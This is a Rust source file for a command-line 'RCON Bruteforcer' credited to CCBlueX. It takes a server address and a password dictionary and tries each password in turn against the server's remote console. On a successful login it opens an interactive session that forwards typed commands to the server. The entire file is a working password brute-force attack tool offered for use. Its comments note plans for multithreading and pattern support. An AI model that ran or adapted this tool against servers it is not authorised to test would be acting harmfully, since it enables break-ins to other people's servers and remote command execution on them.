extern crate rcon;

use std::io::{stdin, BufReader, BufRead};
use rcon::Connection;
use std::process::exit;
use std::env;
use std::fs::File;
use console::style;

fn main() {
    // Welcome message
    println!("{} {} by {}", style("RCON").red().bold(), style("Bruteforcer").red(),
             style("CCBlueX").blue().bold());

    // User input via launch arguments
    let args: Vec<String> = env::args().collect();

    if args.len() <= 2 {
        println!("./rcon-bruteforce [server] [dictionary]");
        return;
    }

    // TODO: Check if addr is valid
    let server = &args[1];

    // TODO: Add pattern support
    let dict = &args[2];

    // Just to verify user input
    println!("{}: {}", style("Server").magenta(), server);
    println!("{}: {}", style("Dictionary").magenta(), dict);
    println!(); // Empty line break

    match File::open(dict) {
        Ok(file) => {
            let reader = BufReader::new(file);

            // TODO: Add multi threading support
            for line in reader.lines() {
                connect(server, line.unwrap().as_str())
            }
        }
        Err(e) => println!("{}", e)
    }
}

fn connect(addr: &str, password: &str) {
    // Connect to server and try password
    match Connection::connect(addr, password) {
        Ok(conn) => {
            // Connection established with correct password
            println!("{}\n", style(format!("Connection established to {} using '{}' as password!",
                                         addr, password)).green().bold());

            handle_session(conn)
        },
        // Connection failed or password wrong (Auth!)
        Err(e) => println!("{}", style(format!("Connection failed to {} using '{}' because of {:?} error!",
                                               addr, password, e)).red()) // Used {:?} for their names. As example "Auth" instead of "authentication failed"
    }
}

fn handle_session(mut connection: Connection) {
    let line = &mut String::new();

    loop {
        // Read line from stdin to buffer
        match stdin().read_line(line) {
            Ok(_) => {
                // Exec command
                match connection.cmd(line) {
                    Ok(response) => println!("{}", response), // Successfully executed command

                    // TODO: Fix library (IO error: Could not read enough bytes)
                    Err(e) => println!("{}", e) // Something went wrong while sending command to server
                }
            }
            Err(_) => exit(1)
        }
    }
}